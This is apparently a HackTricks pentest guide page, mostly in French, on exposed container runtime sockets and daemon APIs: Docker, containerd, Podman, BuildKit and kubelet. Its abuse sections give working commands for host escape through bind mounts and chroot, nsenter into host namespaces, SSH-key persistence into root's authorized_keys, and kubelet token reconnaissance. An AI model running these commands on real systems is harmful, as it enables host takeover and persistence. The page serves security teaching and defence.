# Runtime API And Daemon Exposure

{{#include ../../../banners/hacktricks-training.md}}

## Overview

De nombreux compromissions réelles de conteneurs ne commencent pas du tout par un namespace escape. Elles commencent par un accès au control plane du runtime. Si une workload peut communiquer avec `dockerd`, `containerd`, CRI-O, Podman ou kubelet via un socket Unix monté ou un listener TCP exposé, l'attaquant peut être en mesure de demander la création d'un nouveau conteneur avec de meilleurs privilèges, de monter le filesystem de l'host, de rejoindre les namespaces de l'host ou de récupérer des informations sensibles sur le nœud. Dans ces cas, l'API du runtime constitue la véritable frontière de sécurité, et sa compromission revient fonctionnellement presque à compromettre l'host.

C'est pourquoi l'exposition des runtime sockets doit être documentée séparément des protections du kernel. Un conteneur avec un seccomp, des capabilities et un confinement MAC ordinaires peut tout de même être à un seul appel d'API de la compromission de l'host si `/var/run/docker.sock` ou `/run/containerd/containerd.sock` est monté à l'intérieur. L'isolation kernel du conteneur actuel peut fonctionner exactement comme prévu, tandis que le management plane du runtime reste entièrement exposé.

## Daemon Access Models

Docker Engine expose traditionnellement son API privilégiée via le socket Unix local `unix:///var/run/docker.sock`. Historiquement, il a également été exposé à distance via des listeners TCP tels que `tcp://0.0.0.0:2375` ou un listener protégé par TLS sur `2376`. Exposer le daemon à distance sans TLS robuste ni authentification des clients revient de fait à transformer l'API Docker en interface root distante.

containerd, CRI-O, Podman et kubelet exposent des surfaces similaires à fort impact. Les noms et les workflows diffèrent, mais la logique reste la même. Si l'interface permet à l'appelant de créer des workloads, de monter des chemins de l'host, de récupérer des credentials ou de modifier des conteneurs en cours d'exécution, l'interface constitue un canal de gestion privilégié et doit être traitée en conséquence.

Les chemins locaux courants à vérifier sont :
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Les stacks plus anciennes ou plus spécialisées peuvent également exposer des endpoints tels que `dockershim.sock`, `frakti.sock` ou `rktlet.sock`. Ils sont moins courants dans les environnements modernes, mais lorsqu'ils sont rencontrés, ils doivent être traités avec la même prudence, car ils représentent des surfaces de contrôle du runtime plutôt que de simples sockets d'application.

## Accès distant sécurisé

Si un daemon doit être exposé au-delà du socket local, la connexion doit être protégée par TLS et, de préférence, par une authentification mutuelle afin que le daemon vérifie le client et que le client vérifie le daemon. L'ancienne habitude d'ouvrir le daemon Docker en HTTP en clair par commodité est l'une des erreurs les plus dangereuses de l'administration des containers, car la surface de l'API est suffisamment puissante pour créer directement des containers privilégiés.

La configuration Docker historique se présentait ainsi :
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Sur les hosts basés sur systemd, la communication avec le daemon peut également apparaître sous la forme `fd://`, ce qui signifie que le processus hérite d’un socket préouvert par systemd au lieu de le binder directement. L’essentiel n’est pas la syntaxe exacte, mais la conséquence en matière de sécurité. Dès que le daemon écoute au-delà d’un socket local soumis à des permissions strictes, la sécurité du transport et l’authentification du client deviennent obligatoires, et non plus un simple hardening optionnel.

## Abuse

Si un runtime socket est présent, confirmez lequel c’est, vérifiez si un client compatible existe et si un accès HTTP brut ou gRPC est possible :
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Ces commandes sont utiles, car elles permettent de distinguer un chemin mort, un socket monté mais inaccessible et une API privilégiée active. Si le client réussit, la question suivante est de savoir si l’API peut lancer un nouveau container avec un bind mount vers l’hôte ou un partage de namespace de l’hôte.

### Lorsqu’aucun client n’est installé

L’absence de `docker`, `podman` ou d’un autre CLI convivial ne signifie pas que le socket est sécurisé. Docker Engine utilise HTTP sur son socket Unix, et Podman expose à la fois une API compatible avec Docker et une API native Libpod via `podman system service`. Cela signifie qu’un environnement minimal disposant uniquement de `curl` peut tout de même suffire à piloter le daemon :
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Cela est important pendant le post-exploitation, car les défenseurs suppriment parfois les binaires client habituels, tout en laissant le socket de management monté. Sur les hôtes Podman, n'oubliez pas que le chemin à forte valeur diffère selon les déploiements rootful et rootless : `unix:///run/podman/podman.sock` pour les instances de service rootful et `unix://$XDG_RUNTIME_DIR/podman/podman.sock` pour les instances rootless.

### Full Example: Docker Socket To Host Root

Si `docker.sock` est accessible, l'escape classique consiste à démarrer un nouveau container qui monte le système de fichiers racine de l'hôte, puis à y exécuter `chroot` :
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Cela permet une exécution directe avec les privilèges root de l’hôte via le daemon Docker. L’impact ne se limite pas à la lecture de fichiers. Une fois dans le nouveau container, l’attaquant peut modifier les fichiers de l’hôte, récupérer des credentials, implanter une persistence ou lancer d’autres workloads privilégiés.

### Exemple complet : Docker Socket vers les namespaces de l’hôte

Si l’attaquant préfère l’entrée dans les namespaces plutôt qu’un accès limité au système de fichiers :
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
This path reaches the host by asking the runtime to create a new container with explicit host-namespace exposure rather than by exploiting the current one.

### Docker Socket Persistence Pattern

Runtime control can also be used for persistence instead of a one-shot shell. The generic pattern is to create a helper container with a host mount, write authorized access material or a startup hook into the mounted host filesystem, and then validate that the host consumes it.

Example shape:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
La même idée peut cibler les unités systemd, les fragments cron, les fichiers de démarrage des applications ou les clés SSH, selon ce que l'opérateur souhaite démontrer. Le point important est que la modification persistante est effectuée via l'autorité du daemon runtime sur le système de fichiers de l'hôte, et non par l'intermédiaire de privilèges supplémentaires dans le conteneur d'origine.

### Raw Docker API Helper Pivot

Lorsque la Docker CLI est absente, le même flux d'assistant avec host-mount peut être exécuté via HTTP sur le socket Unix. Le flux générique est le suivant : confirmer l'API, créer un conteneur assistant avec un bind mount vers l'hôte, le démarrer, créer une instance exec, puis démarrer cet exec.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
La requête finale `/exec/<id>/start` dépend de l’ID exec renvoyé, mais le point de sécurité est indépendant de la plomberie JSON exacte : un accès direct à l’API d’un daemon Docker rootful suffit pour demander un workload auxiliaire plus puissant.

### Exemple complet : socket containerd

Un socket `containerd` monté est généralement tout aussi dangereux :
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Si un client plus proche de Docker est présent, `nerdctl` peut être plus pratique que `ctr`, car il expose des options familières telles que `--privileged`, `--pid=host` et `-v` :
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
L'impact est à nouveau une compromission de l'hôte. Même si les outils spécifiques à Docker sont absents, une autre runtime API peut toujours offrir le même niveau de contrôle administratif. Sur les nœuds Kubernetes, `crictl` peut également suffire pour la reconnaissance et l'interaction avec les containers, car il communique directement avec l'endpoint CRI.

### BuildKit Socket

`buildkitd` est facile à négliger, car on le considère souvent comme « uniquement le backend de build », mais le daemon reste malgré tout un control plane privilégié. Un `buildkitd.sock` accessible peut permettre à un attaquant d'exécuter des étapes de build arbitraires, d'inspecter les capacités des workers, d'utiliser les contextes locaux de l'environnement compromis et de demander des entitlements dangereux tels que `network.host` ou `security.insecure`, lorsque le daemon a été configuré pour les autoriser.

Les premières interactions utiles sont les suivantes :
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Si le daemon accepte des demandes de build, testez si des entitlements non sécurisés sont disponibles :
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
L’impact exact dépend de la configuration du daemon, mais un service BuildKit rootful avec des entitlements permissifs n’est pas une simple commodité inoffensive pour les développeurs. Considérez-le comme une autre surface administrative à forte valeur, en particulier sur les runners CI et les nœuds de build partagés.

### API Kubelet sur TCP

Le kubelet n’est pas un container runtime, mais il fait tout de même partie du plan de gestion du nœud et se trouve souvent dans le même périmètre de confiance. Si le port sécurisé `10250` du kubelet est accessible depuis le workload, ou si des identifiants de nœud, des kubeconfigs ou des droits de proxy sont exposés, l’attaquant peut être en mesure d’énumérer les Pods, de récupérer des logs ou d’exécuter des commandes dans des conteneurs locaux au nœud sans jamais passer par le chemin d’admission du serveur API Kubernetes.

Commencez par une reconnaissance peu coûteuse :
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Si le kubelet ou le chemin proxy de l’API-server autorise `exec`, un client compatible avec WebSocket peut transformer cela en exécution de code dans d’autres containers du node. C’est également pourquoi `nodes/proxy` avec la seule permission `get` est plus dangereux qu’il n’y paraît : la requête peut tout de même atteindre des endpoints du kubelet qui exécutent des commandes, et ces interactions directes avec le kubelet n’apparaissent pas dans les logs d’audit Kubernetes normaux.

## Checks

L’objectif de ces checks est de déterminer si le container peut atteindre un plan de gestion qui aurait dû rester en dehors de la frontière de confiance.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Ce qui est intéressant ici :

- Un runtime socket monté constitue généralement une primitive d’administration directe, et non une simple divulgation d’informations.
- Un listener TCP sur `2375` sans TLS doit être considéré comme une condition de compromission à distance.
- Des variables d’environnement telles que `DOCKER_HOST` révèlent souvent que le workload a été intentionnellement conçu pour communiquer avec le runtime de l’hôte.

## Valeurs par défaut des runtimes

| Runtime / plateforme | État par défaut | Comportement par défaut | Affaiblissement manuel courant |
| --- | --- | --- | --- |
| Docker Engine | Unix socket local par défaut | `dockerd` écoute sur le socket local et le daemon est généralement rootful | montage de `/var/run/docker.sock`, exposition de `tcp://...:2375`, TLS faible ou absent sur `2376` |
| Podman | CLI daemonless par défaut | Aucun daemon privilégié persistant n’est requis pour l’utilisation locale courante ; des API sockets peuvent toutefois être exposés lorsque `podman system service` est activé | exposition de `podman.sock`, exécution du service avec une portée trop large, utilisation d’une API rootful |
| containerd | Socket local privilégié | L’API d’administration est exposée via le socket local et généralement utilisée par des outils de niveau supérieur | montage de `containerd.sock`, accès étendu à `ctr` ou `nerdctl`, exposition de namespaces privilégiés |
| CRI-O | Socket local privilégié | Le endpoint CRI est destiné aux composants de confiance locaux au nœud | montage de `crio.sock`, exposition du endpoint CRI à des workloads non fiables |
| Kubernetes kubelet | API de gestion locale au nœud | Kubelet ne devrait pas être largement accessible depuis les Pods ; selon l’authn/authz, l’accès peut exposer l’état des Pods, des credentials et des fonctionnalités d’exécution | montage de sockets ou de certificats kubelet, authentification kubelet faible, host networking avec endpoint kubelet accessible |

## Références

- [Exploitation du socket containerd, partie 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [Risques de contournement de l’API Server Kubernetes](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
